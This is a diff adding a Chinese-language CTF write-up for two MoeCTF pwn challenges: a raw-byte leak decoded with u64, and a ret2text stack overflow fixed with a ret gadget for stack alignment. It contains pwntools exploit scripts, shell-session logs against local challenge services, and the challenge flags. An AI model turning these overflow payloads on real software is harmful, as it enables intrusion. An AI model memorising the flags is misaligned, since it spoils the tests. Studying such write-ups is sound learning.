@@ -258,3 +258,824 @@ __int64 __fastcall bypass(__int64 a1)
 一般来讲，我们使用的终端都被配置为了规范模式，也就是运行在行缓冲模式下，这也是为什么我们通常认为，输入完一个东西后，必须要回车才能进行下一步。每当我们敲下回车，终端就会将缓冲区内的数据送到标准输入里；但事实上，程序对于行缓冲是无感的：它不知道你在敲回车键之前是怎么输入的，输入了多少，它只知道标准输入不知为何突然多了一些东西，然后它从标准输入取回这些东西就好了。而标准输入也不总是来自一个配置为行缓冲的交互式终端；它可以来自很多地方，无论是文件重定向、管道、还是像 Pwntools 这样的网络套接字（Socket）。
 
 对于本题的 `pwn` 程序而言，它也感受不到自己正在和网络交互，它只是通过 `read` 函数，从标准输入里读取数据罢了。通过网络套接字传输的数据是没有「行缓冲」这种概念的：你 `send` 了什么，它就 `read` 什么；这就够了。
+
+## 1 ez_u64
+
+> [!NOTE]
+> **FLAG:** `moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}`
+
+继续打开 IDA Pro 逆向。首先定位到 `main` 函数如下：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  init(argc, argv, envp);
+  vuln();
+  return 0;
+}
+```
+
+人畜无害。率先定位到 `init` 函数如下：
+
+```c
+int init()
+{
+    int fd; // [rsp+Ch] [rbp-4h]
+
+    setbuf(stdin, 0LL);
+    setbuf(_bss_start, 0LL);
+    setbuf(stderr, 0LL);
+    fd = open("/dev/urandom", 0, 0LL);
+    if ( fd < 0 )
+    {
+        puts("urandom");
+        exit(1);
+    }
+    read(fd, &num, 8uLL);
+    return close(fd);
+}
+```
+
+程序设置了缓冲区大小为 0，然后设置文件描述符 `fd` 指向 Linux 随机数源设备，读取它的 8 个字节并保存到 `num` 变量中。容易看到这是一个随机数生成器。然后再看 `vuln` 函数：
+
+```c
+unsigned __int64 vuln()
+{
+    __int64 v1; // [rsp+0h] [rbp-10h] BYREF
+    unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+    v2 = __readfsqword(0x28u);
+    puts("Ya hello! Let's play a game.");
+    printf("Guess which number I'm thinking of.");
+    printf("Here is the hint.");
+    write(1, &num, 8uLL);
+    printf("\n>");
+    __isoc99_scanf("%zu", &v1);
+    if ( v1 != num )
+    {
+        puts("Wrong answer!");
+        puts("Try pwntools u64?");
+        exit(1);
+    }
+    puts("Win!");
+    system("/bin/sh");
+    return v2 - __readfsqword(0x28u);
+}
+```
+
+在打印完一些文本后，它直接将 `num` 这 8 个字节数据的原始的、二进制的、未经任何处理的值写到了标准输出里！那很简单了：我们只需要截取这 8 个字节，再转成一个整数发送过去，不就行了吗？
+
+构造 Pwntools 脚本：
+
+```python
+from pwn import *
+
+context(arch="amd64", os="linux", log_level="debug")
+
+io = connect("127.0.0.1", 13580)
+
+io.recvuntil(b"Here is the hint.")
+leaked_bytes = io.read(8)
+log.info(f"Leaked raw bytes: {leaked_bytes}")
+
+the_number = u64(leaked_bytes)
+log.info(f"Decoded number: {the_number}")
+
+io.sendlineafter(b">", str(the_number))
+io.interactive()
+```
+
+进入 `interactive` 模式后，只需注意到 `flag` 位于 `./flag` 中。
+
+```plain
+cat flag
+[DEBUG] Sent 0x1 bytes:
+    b'c'
+[DEBUG] Sent 0x1 bytes:
+    b'a'
+[DEBUG] Sent 0x1 bytes:
+    b't'
+[DEBUG] Sent 0x1 bytes:
+    b' '
+[DEBUG] Sent 0x1 bytes:
+    b'f'
+[DEBUG] Sent 0x1 bytes:
+    b'l'
+[DEBUG] Sent 0x1 bytes:
+    b'a'
+[DEBUG] Sent 0x1 bytes:
+    b'g'
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+[DEBUG] Received 0x2a bytes:
+    b'moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}\n'
+moectf{uSEfUl_thlNgs_1n-pwNTO0156775935f}
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 13580
+```
+
+## 2 EZtext
+
+> [!NOTE]
+> 虽说是 `EZtext`，但对于星澜音这种纯粹的新手而言并不 easy……星澜音又花了整整一天时间弄懂这道题背后的全部逻辑……😭😭不过的确还好：星澜音第一次学会诸如堆栈结构、函数调用之类的东西，其实也应当算是收获满满了w——
+>
+> **FLAG:** `moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}`
+
+用 IDA Pro 逆向题目给定的 `pwn` 文件。首先观察一下 `main` 函数：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF
+
+    init(argc, argv, envp);
+    puts("Stack overflow is a powerful art!");
+    puts("In this MoeCTF,I will show you the charm of PWN!");
+    puts("You need to know the struct of stack first.");
+    puts("Then how many bytes do you need to overflow the stack?");
+    __isoc99_scanf("%d", &v4);
+    overflow(v4);
+    return 0;
+}
+```
+
+`main` 函数调起 `init` 函数，后者设置无缓冲区模式后，前者打印四行文本，并要求用户输入，由 `scanf`（准确来说是 C99 标准下的 `__isoc99_scanf`）从标准输入中读取一个十进制整数，将该整数作为参数传入 `overflow` 函数。下面我们来看 `overflow` 函数：
+
+```c
+int __fastcall overflow(int a1)
+{
+    char buf[8]; // [rsp+18h] [rbp-8h] BYREF
+
+    if ( a1 <= 7 )
+        return puts("Come on, you can't even fill this array!");
+    read(0, buf, a1);
+    return puts("OK,I receive your byte.and then?");
+}
+```
+
+`overflow` 函数会在栈内申请一个大小为 8 字节的 `buf` 字符数组，随后先判断 `a1` 的值是否大于等于 8，若否，则直接返回；若是，则继续从标准输入读取至多 `a1` 字节大小的数据并填充到 `buf` 中。但…整个程序到这就…结束了？
+
+是的，看起来的确是这样。我们在 IDA Pro 中仔细寻找，终于找出了另一个函数：`treasure`！它长这样：
+
+```c
+int treasure()
+{
+    puts("Congratulations! You got the secret!");
+    return system("/bin/sh");
+}
+```
+
+拿到了 `/bin/sh` 我们就可以为所欲为了！但问题是，整个程序的主逻辑与 `treasure` 八竿子打不着，到底怎么样才能想办法跳到 `treasure` 里呢？我们想到了面向结果编程，也就是大名鼎鼎的——**Return-Oriented Programming (ROP)**。
+
+关于 ROP 的基础知识，星澜音是在 Hello CTF 的 [这篇文章](https://hello-ctf.com/hc-pwn/ROP/) 上了解的。
+
+为了构造 ROP 链，我们首先需要了解清楚栈的结构。不妨从 `overflow` 函数先下手。在 `main` 函数调起 `overflow` 函数前，我们粗略画出栈的结构。若无特别说明，以下结构均为高内存地址在上、低内存地址在下。
+
+```plain
+** High Address **
+
+ --------------------  <- rbp
+| `main` stack frame |
+ --------------------  <- rsp
+
+** Low Address **
+```
+
+随后 `main` 进行 `call overflow` 操作。在 IDA Pro 上追踪 `overflow` 的汇编代码，我们有
+
+```asm
+; Attributes: bp-based frame
+
+; int __fastcall overflow(int)
+public overflow
+overflow proc near
+
+var_14= dword ptr -14h     ; 14h = 20 bytes
+buf= byte ptr -8           ; 8 bytes
+
+; __unwind {
+endbr64
+push    rbp                ; Step 1
+mov     rbp, rsp           ; Step 2
+sub     rsp, 20h           ; Step 3, 20h = 32 bytes
+mov     [rbp+var_14], edi  ; Step 4
+cmp     [rbp+var_14], 7    ; Step 5
+jg      short loc_401205
+```
+
+我们对这段代码进行模拟：
+
+执行 `call` 的时候，`rsp` 先向下移动，随后在 `main` 栈帧的下面压入 `main` 的返回地址。
+
+```plain
+** High Address **
+
+ -----------------------  <- rbp
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------  <- rsp
+
+** Low Address **
+```
+
+Step 1 时，`rbp`（Base Pointer，栈基底指针）的当前地址被压栈。压栈过程中，通常 `rsp`（Stack Pointer，栈指针）先向低内存地址移动数个单位，随后数据填充到栈内。栈如下所示：
+
+```plain
+** High Address **
+
+ -----------------------  <- rbp
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rsp
+
+** Low Address **
+```
+
+Step 2 时，将 `rsp` 的值赋给 `rbp`，也就是说，`rbp` 现在移动到了 `rsp` 的位置。
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rbp, rsp
+
+** Low Address **
+```
+
+Step 3 时，`rsp` 的地址向低内存地址移动了 `20h` 个字节，也就是 32 个字节。
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rbp
+|                       |          \
+|                       |          | --> 32 bytes
+|                       |          /
+ -----------------------  <- rsp (rbp-32)
+
+** Low Address **
+```
+
+Step 4 时，将 `edi` 的值写入 `[rbp-14h]` 的位置，也就是 `rbp` 下方 20 字节处。`edi` 的值来自于我们调用 `overflow` 函数时传入的 `a1`，也就是询问我们的字节数，它本身占用 4 个字节。写入数据时，通常从低内存地址向高内存地址开始写，我们所说的写入的位置，指开始写入时的位置。
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rbp
+|                       |             \
+ -----------------------  <- rbp-16   |
+|  /////// a1 ///////   |             | --> 32 bytes
+ -----------------------  <- rbp-20   |
+|                       |             /
+ -----------------------  <- rsp (rbp-32)
+
+** Low Address **
+```
+
+Step 5 时，`cmp` 比较器进行一次比较。类 C 语言代码很清晰地看到，我们需要让 `a1` 的值大于等于 8，故我们直接展开追踪 `short loc_401205` 的汇编代码：
+
+```asm
+loc_401205:
+mov     eax, [rbp+var_14]
+movsxd  rdx, eax        ; nbytes
+lea     rax, [rbp+buf]        ; Step 6
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+call    _read
+lea     rax, aOkIRecvieveYou
+mov     rdi, rax        ; s
+call    _puts
+nop
+```
+
+Step 6 用到了 `lea` 指令，表示加载 `[rbp-8]` 的有效地址到 `rax` 寄存器，后续又正式加载到了 `rsi` 寄存器。这没有改变栈结构，直到 `call _read` 出现——`_read` 取 `rsi` 寄存器内的地址并开始向其中填充数据，
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rbp
+|  \\\\\\ DATA \\\\\\   |             \   ↑  ↑  ↑  ↑  ↑
+ -----------------------  <- rbp-8    | - - - `buf` - - -
+|                       |             |
+ -----------------------  <- rbp-16   | --> 32 bytes
+|  /////// a1 ///////   |             |
+ -----------------------  <- rbp-20   |
+|                       |             /
+ -----------------------  <- rsp (rbp-32)
+
+** Low Address **
+```
+
+而这，就是问题所在！我们先前讨论过 `read()` 函数的性质，在本例中，它至多向 `buf` 写入 `a1` 个字节的数据，但这个 `a1` 完全没有限定！当我们从 `buf` 的起始地址开始向标准输入写入数据时，数据如果过多，就会冲破 `rbp` 的界限，写到 `saved rbp`、直指 `main return address` 里！
+
+但在这之前，我们不妨先思考一下，函数调用结束，即将返回的时候发生了什么。通常情况下，函数该返回的时候，它们会进行两条指令：
+
+```asm
+leave     ; Step 7
+retn      ; Step 8, also `ret`
+```
+
+这里的 `retn` 是 `return near` 的缩写，属于一个历史遗留问题，在 32 位和 64 位的程序反编译中，我们直接将其理解为 `ret` 就好。
+
+Step 7 中，`leave` 会先进行一步 `mov rsp, rbp`。它将 `rbp` 的值直接赋给 `rsp`，也就是将 `rsp` 直接 TP(?) 到 `rbp` 那里。原先 `rsp` 和 `rbp` 之间的所有栈结构会被直接抛弃。当然，这里的「直接抛弃」并不是给这段栈里全部填充 `0`，而是通过改变 `rsp` 的值，直接忽略掉了这片内存区域。
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------
+|      saved `rbp`      |
+ -----------------------  <- rbp, rsp
+|\\\\\\\\\\\\\\\\\\\\\\\|             \
+|\\\\\\\\\\\\\\\\\\\\\\\|             | - - - `buf` - - -
+|\\\\\\\\\ NOT \\\\\\\\\|             |
+|\\\\\\\\ BEING \\\\\\\\|             | --> 32 bytes
+|\\\\\\\\\ USED \\\\\\\\|             |
+|\\\\\\\\\\\\\\\\\\\\\\\|             |
+|\\\\\\\\\\\\\\\\\\\\\\\|             /
+ -----------------------
+
+** Low Address **
+```
+
+随后再进行一步 `pop rbp`。这时，CPU 会从 `rsp` 的位置开始向上读取 8 个字节的数据，并将其加载回 `rbp`，也就是将 `rbp` TP(?) 到数据对应的地址那里。紧随其后地，`rsp` 再向上自己走 8 个字节。这样的话，栈结构就被复原到 `call` 之后的样子了。
+
+```plain
+** High Address **
+
+ -----------------------  <- rbp
+|  `main` stack frame   |
+ -----------------------
+| `main` return address |
+ -----------------------  <- rsp
+|\\\\\ saved `rbp` \\\\\|
+ -----------------------
+|\\\\\\\\\\\\\\\\\\\\\\\|             \
+|\\\\\\\\\\\\\\\\\\\\\\\|             |
+|\\\\\\\\\ NOT \\\\\\\\\|             |
+|\\\\\\\\ BEING \\\\\\\\|             | --> 32 bytes
+|\\\\\\\\\ USED \\\\\\\\|             |
+|\\\\\\\\\\\\\\\\\\\\\\\|             |
+|\\\\\\\\\\\\\\\\\\\\\\\|             /
+ -----------------------
+
+** Low Address **
+```
+
+事实上，Step 7 可以理解为一个打扫屋子的过程，而 Step 8 就是一个交还钥匙的过程。`retn`，或者我们直接称为 `ret`，执行了一步 `pop rip`。`RIP` 是程序指针，它指示 CPU 应该从哪里继续进行程序。在这一步中，CPU 从 `rsp` 所在的地方向上读取 8 个字节数据，并直接传入 `rip` 中，随后 `rsp` 自身再向上移动 8 个字节。栈结构此时被完全还原；而我们的 CPU 也会在接下来直接按照 `RIP` 的指示去执行指令。就好像，`overflow` 函数从来没有被调用过一样。
+
+```plain
+** High Address **
+
+ -----------------------  <- rbp
+|  `main` stack frame   |
+ -----------------------  <- rsp
+|\`main` return address\|      --> to rip
+ -----------------------
+|\\\\\ saved `rbp` \\\\\|
+ -----------------------
+|\\\\\\\\\\\\\\\\\\\\\\\|
+|\\\\\\\\\\\\\\\\\\\\\\\|
+|\\\\\\\\\ NOT \\\\\\\\\|
+|\\\\\\\\ BEING \\\\\\\\|
+|\\\\\\\\\ USED \\\\\\\\|
+|\\\\\\\\\\\\\\\\\\\\\\\|
+|\\\\\\\\\\\\\\\\\\\\\\\|
+ -----------------------
+
+** Low Address **
+```
+
+我们应当能够想到了——回到刚才的话题，我们可以向标准输入中多写一点东西，直接冲到 `main return address` 里！那么我们究竟要写什么呢？既然我们只关心覆盖到 `main return address` 的部分，那其实前面的部分，我们想写什么就写些什么好了，只是前面的部分到底写多少，值得我们好好考量一下。再看看栈结构：
+
+```plain
+** High Address **
+
+ -----------------------
+|  `main` stack frame   |
+ -----------------------  <- rbp+16
+| `main` return address |
+ -----------------------  <- rbp+8
+|      saved `rbp`      |
+ -----------------------  <- rbp
+|  \\\\\\ DATA \\\\\\   |                ↑  ↑  ↑  ↑  ↑
+ -----------------------  <- rbp-8     - - - START - - -
+|                       |             
+           ...
+
+** Low Address **
+```
+
+没错！从 `START` 开始向高内存地址写入，首先随便填充一个 8 字节的数据，其次再随便填充一个 8 字节的数据（覆盖掉 `saved rbp`），最后再填充一个 8 字节的 `treasure` 地址，这样程序返回的时候，就可以直接返回到 `treasure` 了！非常天才的主意！
+
+但多愁善感的人可能会疑惑：这样粗鲁的覆盖，直接干掉了 `saved rbp` 和 `main return address`，那 `main` 怎么办？事实上，从理性的角度来讲，`main` 还真没办法。就好比我们是入室盗窃的小偷（？），从庭院走到门口拿钥匙开锁，那么这中间路上的地毯，是我们必须要踩上去的。况且在调用 `overflow` 的时候，`main` 已经处于了一个类似于休眠的状态——它一直等着 `overflow` 执行完回来叫它，只要没人叫它，它就一直睡着。不过我们现在没必要返回 `main` 了，因为我们要返回的是 `overflow`，所以我们也没必要叫醒 `main`；它的返回地址和预先保留的 `rbp`，该怎么覆盖也不会吵醒它；而至于 `rbp` 究竟要去哪，我们后续自会决定。~~相当于是给 `main` 安乐死了，所以还是比较人道的。~~
+
+构造 Pwntools 脚本如下：
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+io = connect('127.0.0.1', 4807)
+
+TREASURE_ADDR = 0x4011b6
+
+payload = b'LYRINLOVESDRYICE' + p64(TREASURE_ADDR)
+log.info(f"Payload constructed with length: {len(payload)}")
+
+io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
+io.send(payload)
+
+io.interactive()
+```
+
+运行，输出！
+
+```plain
+PS S:\MoeCTF\Pwn\2> python .\flag.py
+[x] Opening connection to 127.0.0.1 on port 4807
+[x] Opening connection to 127.0.0.1 on port 4807: Trying 127.0.0.1
+[+] Opening connection to 127.0.0.1 on port 4807: Done
+[*] Payload constructed with length: 24
+[DEBUG] Received 0xc3 bytes:
+    b'Stack overflow is a powerful art!\n'
+    b'In this MoeCTF,I will show you the charm of PWN!\n'
+    b'You need to understand the structure of the stack first.\n'
+    b'Then how many bytes do you need to overflow the stack?\n'
+[DEBUG] Sent 0x3 bytes:
+    b'24\n'
+[DEBUG] Sent 0x18 bytes:
+    00000000  4c 59 52 49  4e 4c 4f 56  45 53 44 52  59 49 43 45  │LYRI│NLOV│ESDR│YICE│
+    00000010  b6 11 40 00  00 00 00 00                            │··@·│····│
+    00000018
+[*] Switching to interactive mode
+
+[DEBUG] Received 0x20 bytes:
+    b'OK,I receive your byte.and then?'
+OK,I receive your byte.and then?[DEBUG] Received 0x26 bytes:
+    b'\n'
+    b'Congratulations! You got the secret!\n'
+
+Congratulations! You got the secret!
+[*] Got EOF while reading in interactive
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 4807
+```
+
+嗯\~跳转成功……哎你怎么似了？😰
+
+很遗憾，我们在进入 `interactive` 模式的时候突发 EOF，程序崩了。可能有人认为是网络问题，但是多试了几次之后，发现问题依旧。太诡异了。
+
+我们重新捋一下思路：按道理，既然已经显示出了 `Congratulations! You got the secret!`，证明的确已经进入了 `treasure` 函数的逻辑，也就是说，它没有道理不执行 `return system("/bin/sh");` 这一行命令。事实上我们即使用逻辑也能推断出，程序绝对是走到了这里的，但走到这里之后呢，去了哪里，我们便无从得知了。
+
+> [!TIP]
+>
+> 在 Linux 系统中，`system` 通常是一个阻塞型命令。它会等待用户执行结束后才会以返回值返回。因此，就算是跳转出 `treasure` 命令的时候程序才崩溃，也应该是我们拿完 `flag` 之后才崩溃。但既然我们现在根本无法进入 `/bin/sh`，那么就说明问题一定是出在 `return system("/bin/sh")` 这一行。
+
+我们在题目 0 中了解过，Pwntools 也可以对本地文件进行调试，只需要将其附加到 `gdb` 上即可。构造如下 Pwntools 脚本：
+
+```python
+from pwn import *
+
+context.binary = './pwn'
+TREASURE_ADDR = 0x4011b6
+
+payload = b'LYRINLOVESDRYICE' + p64(TREASURE_ADDR)
+log.info(f"Payload constructed with length: {len(payload)}")
+
+io = gdb.debug('./pwn', gdbscript=f'''
+break *{hex(TREASURE_ADDR)}
+continue
+''')
+
+io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
+io.send(payload)
+io.interactive()
+```
+
+运行，输出：
+
+```plain
+┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/2]
+└─$ python ./flag.py
+[*] '/home/stellalyrin/MoeCTF/Pwn/2/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[*] Payload constructed with length: 24
+[+] Starting local process '/usr/bin/gdbserver': pid 153747
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn', '-x', '/tmp/pwnlib-gdbscript-7rdw_qfr.gdb']
+[*] Switching to interactive mode
+
+OK,I receive your byte.and then?
+Congratulations! You got the secret!
+
+Child terminated with signal = 0xb (SIGSEGV)
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 153750)
+```
+
+可以看到，在 `treasure` 运行之前时，程序都还非常正常；但的确，一进入 `system` 指令，程序立刻抛出 `SIGSEGV` 异常（Segmentation Violation，段错误）。何意味？于是只能带着这些错误日志去问 AI 了，结果问出了一个特别致命的东西：**函数调用栈对齐**。
+
+> [!TIP]
+>
+> 在 Linux（尤其是 x86-64 架构）下，ABI（Application Binary Interface）规范规定函数调用时，栈指针 `RSP` 必须在调用点对齐到 16 字节边界。
+
+具体来说，在 64 位 Linux 常见的 System V ABI 下：我们调用一个函数的时候，调用者必须保证其在执行 `call` 指令时，栈顶 `RSP` 必须是 16 字节对齐的。SSE/AVX 指令集只有这样才能高效读写寄存器，也能避免不必要的性能开销。
+
+一般的 `call` 的调用者一定会保证 `RSP` 在 16 字节对齐，随后 `call` 将返回地址（8 字节）压栈，进入被调函数后，便会 `RSP % 16 = 8`。但问题是，我们引导程序进入 `treasure` 函数时，并没有使用正常的 `call` 指令！
+
+不妨再看一下 `treasure` 函数的汇编代码：
+
+```asm
+; Attributes: bp-based frame
+
+; int treasure()
+public treasure
+treasure proc near
+; __unwind {
+endbr64
+push    rbp
+mov     rbp, rsp
+lea     rax, s          ; "Congratulations! You got the secret!"
+mov     rdi, rax        ; s
+call    _puts
+lea     rax, command    ; "/bin/sh"
+mov     rdi, rax        ; command
+call    _system
+nop
+pop     rbp
+retn
+; } // starts at 4011B6
+treasure endp
+```
+
+可以画出进入 `treasure` 时的栈结构：
+
+```plain
+** High Address **
+
+ ----------------------
+|  `main` stack frame  |
+ ----------------------  <- rsp   ; % 16 = 0
+|  `treasure` address  |
+ ----------------------           ; % 16 = 8
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------           ; % 16 = 0
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|                      |
+           ...
+
+** Low Address **
+```
+
+接下来，`rbp` 压栈，但唯独需要注意的是，因为我们之前覆盖 `main return address` 时已经覆盖掉了 `saved RBP`，所以现在这个 `rbp` 在哪我们也不清楚：
+
+```plain
+** High Address **
+
+ ----------------------
+|  `main` stack frame  |
+ ----------------------
+|  ??? saved `RBP` ??? |
+ ----------------------  <- rsp   ; % 16 = 8
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|                      |
+           ...
+
+** Low Address **
+```
+
+不过新的 `rbp` 很快就会移动到 `rsp` 处：
+
+```plain
+** High Address **
+
+ ----------------------
+|  `main` stack frame  |
+ ----------------------
+|  ??? saved `RBP` ??? |
+ ----------------------  <- rsp,  ; % 16 = 8
+|  \\\\\\ DATA \\\\\\  |    rbp
+ ----------------------
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|                      |
+           ...
+
+** Low Address **
+```
+
+问题便显现了：我们在 `call system` 的时候，没有保证 RSP 的 16 字节对齐！但明明调用 `_puts` 的时候，RSP 也没有 16 字节对齐，为何 `_puts` 可以正常运行，但 `system` 不行呢？个人推测，`_puts` 的逻辑比较简单，所以 16 字节未对齐的影响并不是很大；但 `system` 就比较复杂，它要求调用点对齐必须成立，因为 `system` 可能会调用诸如 `movaps` 或 `movdqa` 之类的指令，而这些指令是必须要求对齐的。如果我们不对齐，那就指定 SIGSEGV 了。
+
+那么怎么才能让它在调用前 16 字节对齐呢？我们需要借助一个神秘的东西：**ROP gadget**。
+
+```plain
+┌──(stellalyrin㉿lyrin-A16)-[~/MoeCTF/Pwn/2]
+└─$ ROPgadget --binary ./pwn --only "ret"
+Gadgets information
+============================================================
+0x000000000040101a : ret
+
+Unique gadgets found: 1
+```
+
+这里找到一个仅含 `ret` 的 gadget。我们探讨过 `ret` 的性质。这里，先给出 payload 的构造：它由 16 个字节的任意数据，一个 `ret` gadget 的地址和一个 `treasure` 的地址组成。由于 `ret` 会 `pop` 掉栈内 8 个字节的数据，它便巧妙地将栈 16 字节对齐了！
+
+经过 `ret` 的 `pop` 后，进入 `treasure` 的栈结构如图所示：
+
+```plain
+** High Address **
+
+ ----------------------  <- rsp   ; % 16 = 8
+|  `treasure` address  |
+ ----------------------           ; % 16 = 0
+|    `ret` address     |
+ ----------------------           ; % 16 = 8
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------           ; % 16 = 0
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|                      |
+           ...
+
+** Low Address **
+```
+
+仍然进行一步 `rbp` 压栈：
+
+```plain
+** High Address **
+
+ ----------------------           ; % 16 = 8
+| ??? saved `rbp` ???? |
+ ----------------------  <- rsp   ; % 16 = 0
+|    `ret` address     |
+ ----------------------           ; % 16 = 8
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------           ; % 16 = 0
+|  \\\\\\ DATA \\\\\\  |
+ ----------------------
+|                      |
+           ...
+
+** Low Address **
+```
+
+之后，我们就会发现，此时的 `rsp` 终于 16 字节对齐了！现在，`system` 指令就能完美进行！
+
+构造 Pwntools 脚本如下：
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+io = connect('127.0.0.1', 13202)
+
+TREASURE_ADDR = 0x4011b6
+GADGET_ADDR = 0x40101a
+
+payload = b'LYRINLOVESDRYICE' + p64(GADGET_ADDR) + p64(TREASURE_ADDR)
+log.info(f"Payload constructed with length: {len(payload)}")
+
+io.sendlineafter(b'overflow the stack?', str(len(payload)).encode())
+io.send(payload)
+io.interactive()
+```
+
+运行：
+
+```plain
+PS S:\MoeCTF\Pwn\2> python .\flag.py
+[x] Opening connection to 127.0.0.1 on port 13202
+[x] Opening connection to 127.0.0.1 on port 13202: Trying 127.0.0.1
+[+] Opening connection to 127.0.0.1 on port 13202: Done
+[*] Payload constructed with length: 32
+[DEBUG] Received 0xc3 bytes:
+    b'Stack overflow is a powerful art!\n'
+    b'In this MoeCTF,I will show you the charm of PWN!\n'
+    b'You need to understand the structure of the stack first.\n'
+    b'Then how many bytes do you need to overflow the stack?\n'
+[DEBUG] Sent 0x3 bytes:
+    b'32\n'
+[DEBUG] Sent 0x20 bytes:
+    00000000  4c 59 52 49  4e 4c 4f 56  45 53 44 52  59 49 43 45  │LYRI│NLOV│ESDR│YICE│
+    00000010  1a 10 40 00  00 00 00 00  b6 11 40 00  00 00 00 00  │··@·│····│··@·│····│
+    00000020
+[*] Switching to interactive mode
+
+[DEBUG] Received 0x20 bytes:
+    b'OK,I receive your byte.and then?'
+OK,I receive your byte.and then?[DEBUG] Received 0x26 bytes:
+    b'\n'
+    b'Congratulations! You got the secret!\n'
+
+Congratulations! You got the secret!
+ls
+[DEBUG] Sent 0x1 bytes:
+    b'l'
+[DEBUG] Sent 0x1 bytes:
+    b's'
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+[DEBUG] Received 0x2c bytes:
+    b'bin\n'
+    b'flag\n'
+    b'lib\n'
+    b'lib32\n'
+    b'lib64\n'
+    b'libexec\n'
+    b'libx32\n'
+    b'pwn\n'
+bin
+flag
+lib
+lib32
+lib64
+libexec
+libx32
+pwn
+cat flag
+[DEBUG] Sent 0x1 bytes:
+    b'c'
+[DEBUG] Sent 0x1 bytes:
+    b'a'
+[DEBUG] Sent 0x1 bytes:
+    b't'
+[DEBUG] Sent 0x1 bytes:
+    b' '
+[DEBUG] Sent 0x1 bytes:
+    b'f'
+[DEBUG] Sent 0x1 bytes:
+    b'l'
+[DEBUG] Sent 0x1 bytes:
+    b'a'
+[DEBUG] Sent 0x1 bytes:
+    b'g'
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+[DEBUG] Received 0x2c bytes:
+    b'moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}\n'
+moectf{r3TZtExt_I5-tH3-5tart-0f_RoP7db14b3}
+exit
+[DEBUG] Sent 0x1 bytes:
+    b'e'
+[DEBUG] Sent 0x1 bytes:
+    b'x'
+[DEBUG] Sent 0x1 bytes:
+    b'i'
+[DEBUG] Sent 0x1 bytes:
+    b't'
+[DEBUG] Sent 0x1 bytes:
+    b'\n'
+[*] Got EOF while reading in interactive
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 13202
+```
+
+结束。
+
+至于我们 `exit` 之后程序会怎么走，这其实已经不重要了。事实上，我们仍然没有为程序指定一个 `system` 之后的返回地址，但鉴于我们已经拿到了 `flag`，再多的段错误也已经和我们无关了。
